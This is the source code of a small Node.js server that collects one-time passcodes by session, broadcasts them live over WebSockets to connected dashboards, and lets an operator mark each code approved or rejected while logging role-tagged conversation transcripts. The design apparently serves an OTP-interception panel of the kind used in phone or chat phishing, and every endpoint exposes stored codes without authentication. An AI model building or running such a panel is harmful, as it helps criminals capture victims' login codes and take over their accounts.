const express = require('express');
const cors = require('cors');
const { WebSocketServer, WebSocket } = require('ws');
const http = require('http');

const app = express();
const server = http.createServer(app);

const wss = new WebSocketServer({ server });

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const pending = {};
const conversations = {};

function broadcast(event, data) {
  const msg = JSON.stringify({ event, data });
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) client.send(msg);
  });
}

app.post('/submit-otp', (req, res) => {
  const { session_id, otp } = req.body;
  if (!session_id || !otp) return res.status(400).json({ error: 'Missing fields' });
  pending[session_id] = { otp, status: 'pending', timestamp: Date.now() };
  if (!conversations[session_id]) conversations[session_id] = [];
  broadcast('otp_received', { session_id, otp, status: 'pending' });
  res.json({ success: true });
});

app.get('/pending', (req, res) => {
  res.json(pending);
});

app.post('/decide', (req, res) => {
  const { session_id, decision } = req.body;
  if (!pending[session_id]) return res.status(404).json({ error: 'Not found' });
  pending[session_id].status = decision;
  broadcast('otp_decision', { session_id, status: decision });
  res.json({ success: true });
});

app.get('/status/:session_id', (req, res) => {
  const entry = pending[req.params.session_id];
  if (!entry) return res.json({ status: 'not_found' });
  res.json({ status: entry.status, otp: entry.otp });
});

app.post('/transcript', (req, res) => {
  const { session_id, role, message, conversation_id } = req.body;
  if (!session_id || !message) return res.status(400).json({ error: 'Missing fields' });
  if (!conversations[session_id]) conversations[session_id] = [];
  const entry = { role: role || 'unknown', message, conversation_id, timestamp: Date.now() };
  conversations[session_id].push(entry);
  broadcast('transcript_message', { session_id, ...entry });
  res.json({ success: true });
});

app.get('/transcript/:session_id', (req, res) => {
  res.json(conversations[req.params.session_id] || []);
});

wss.on('connection', (ws) => {
  ws.send(JSON.stringify({ event: 'init', data: { pending, conversations } }));
});

server.listen(3000, () => console.log('Server running on port 3000'));
